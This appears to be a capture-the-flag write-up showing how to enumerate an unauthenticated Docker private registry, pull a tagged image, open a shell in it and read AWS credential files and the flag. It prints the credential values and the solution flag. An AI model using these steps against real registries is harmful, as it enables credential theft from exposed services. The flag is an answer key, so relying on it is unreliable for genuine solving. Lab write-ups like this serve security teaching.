Level 13: India
===============

Description
-----------

```
We use docker private registry to host our secure AWS app.

52.53.166.207
```
**Points**: 500

WriteUp
-------

So it seems that the company has started their own *Docker Hub*. A Google search for `docker private registry` throws interesting results such as [this](https://docs.docker.com/registry/deploying/). What is interesting from it is the fact that they are typically up in port 5000 and deployed with:

```
[…]
$ docker run -d -p 5000:5000 --restart=always --name registry registry:2
[…]
```

Typically, if we want to search in Docker Hub we can use `docker search whatever` but it is not possible to launch it directly to a private hub. Coming back to Google, we know want to try recover the available Docker images in the private hub and we find [this](https://forums.docker.com/t/docker-private-registry-how-to-list-all-images/21136/3) in the Docker Forums which claims that it is easy to call listing `https://<host>:<port>/v2/_catalog`. 

So, it's time to try it:
```
 curl http://52.53.166.207:5000/v2/_catalog
{"repositories":["dev-aws-test-code"]}
```
Great, it seems that we have found an image that matches the description of the challenge. Knowing that, the first idea is to try to directly recover the docekr image using `docker pull` but it says that it is not possible to recover the latest image:

```
$ docker pull 52.53.166.207:5000/dev-aws-test-code
Using default tag: latest
Pulling repository 52.53.166.207:5000/dev-aws-test-code
Error: image dev-aws-test-code:latest not found
```

So, this is an error that simply says that there is not image tagged as `:latest`, which is the default tag assumed when not provided. As we do not have Docker Hub web UI to ask for it, we come back to Google to ask for a way of listing the tags of an image and we find [this](https://docs.docker.com/registry/spec/api/#listing-image-tags) in the Docker documentation:

![](res/level_13-list_images.png)

```
$ curl http://52.53.166.207:5000/v2/dev-aws-test-code/tags/list
{"name":"dev-aws-test-code","tags":["notreadyet"]}
```


But trying will raise errors because it will try to recover the images from a secure regitry using SSL. We have to take into account that we have to add the repository (`52.53.166.207:5000`) as an insecure repository to a specific daemon.json file that we have to create (full documentation [here](https://docs.docker.com/registry/insecure/).

The details of the daemon.json are simple:
```
{ "insecure-registries":["52.53.166.207:5000"] }
```
In my case, I have had to restart Docker before pulling the image from the new registry:

```
docker pull 52.53.166.207:5000/dev-aws-test-code
```

So that's why it crashed: there is no `latest` tag but there is a `notreadyet` (note that it's with just one 'y'). Time to pull it:

```
docker pull 52.53.166.207:5000/dev-aws-test-code:notreadyet
```

Once pulled, it's time to run the image with an interactive shell

```
docker run -it 52.53.166.207:5000/dev-aws-test-code:notreadyet
```
As it opens by default `htop`, we opt for opening it with an itneractive Bash shell

```
docker run -it 52.53.166.207:5000/dev-aws-test-code:notreadyet /bin/bash
docker: Error response from daemon: oci runtime error: container_linux.go:247: starting container process caused "exec: \"/bin/bash\": stat /bin/bash: no such file or directory".
```

The crash is suspicious, but we can try with `/bin/sh` nd it just works

```
docker run -it 52.53.166.207:5000/dev-aws-test-code:notreadyet /bin/sh
```


And inside the image, it's pretty straightforward. The lines that follow are copied directly from the terminal, but I think that self-explanatory:

```
/ # ls -la
total 6
total 68
drwxr-xr-x   31 root     root          4096 Aug 12 14:03 .
drwxr-xr-x   31 root     root          4096 Aug 12 14:03 ..
drwxr-xr-x    2 root     root          4096 Aug 11 22:56 .aws
-rwxr-xr-x    1 root     root             0 Aug 12 14:03 .dockerenv
drwxr-xr-x    2 root     root          4096 Aug 11 22:56 app
drwxr-xr-x    2 root     root          4096 Jul  5 14:47 bin
drwxr-xr-x    5 root     root           360 Aug 12 14:03 dev
drwxr-xr-x   17 root     root          4096 Aug 12 14:03 etc
drwxr-xr-x    2 root     root          4096 Jul  5 14:47 home
drwxr-xr-x    6 root     root          4096 Jul  5 14:47 lib
drwxr-xr-x    5 root     root          4096 Jul  5 14:47 media
drwxr-xr-x    2 root     root          4096 Jul  5 14:47 mnt
dr-xr-xr-x  298 root     root             0 Aug 12 14:03 proc
drwx------    2 root     root          4096 Aug 12 14:03 root
drwxr-xr-x    2 root     root          4096 Jul  5 14:47 run
drwxr-xr-x    2 root     root          4096 Jul  5 14:47 sbin
drwxr-xr-x    2 root     root          4096 Jul  5 14:47 srv
dr-xr-xr-x   13 root     root             0 Aug 12 14:03 sys
drwxrwxrwt    2 root     root          4096 Jul  5 14:47 tmp
drwxr-xr-x   10 root     root          4096 Jul  5 14:47 usr
drwxr-xr-x   12 root     root          4096 Jul  5 14:47 var

/var # cd
~ # ls -la
total 12
drwx------    2 root     root          4096 Aug 12 14:03 .
drwxr-xr-x   31 root     root          4096 Aug 12 14:03 ..
-rw-------    1 root     root           362 Aug 12 14:06 .ash_history
~ # cd /app/
/app # ls -la
total 12
drwxr-xr-x    2 root     root          4096 Aug 11 22:56 .
drwxr-xr-x   31 root     root          4096 Aug 12 14:03 ..
-rw-r--r--    1 root     root            43 Aug 11 22:56 README.md
/app # cat README.md 
# Welcome

Need to fix the AWS credentials
/ # cd /.aws/
/.aws # ls -la
total 20
drwxr-xr-x    2 root     root          4096 Aug 11 22:56 .
drwxr-xr-x   31 root     root          4096 Aug 12 14:03 ..
-rw-r--r--    1 root     root            39 Aug 11 22:53 config
-rw-r--r--    1 root     root           116 Aug 11 22:54 credentials
-rw-r--r--    1 root     root           136 Aug 11 22:55 flag.txt
/.aws # cat credentials 
[default]
aws_access_key_id=AKIAIOSFODNN7EXAMPLE
aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfioEH62Bzo1TFGabmw
/.aws # cat config 
[default]
region=us-west-2
output=json
/.aws # cat flag.txt 
flag:{ea940af17b004f229329682b4ab0d2502d739920c27d4d6ea94233780fe7fa72c21b31c56e2b4aa68340992a2147056d298870faf4094f179025579a40266cf1}
```
Done! :D

Solution
--------

```flag:{ea940af17b004f229329682b4ab0d2502d739920c27d4d6ea94233780fe7fa72c21b31c56e2b4aa68340992a2147056d298870faf4094f179025579a40266cf1}```
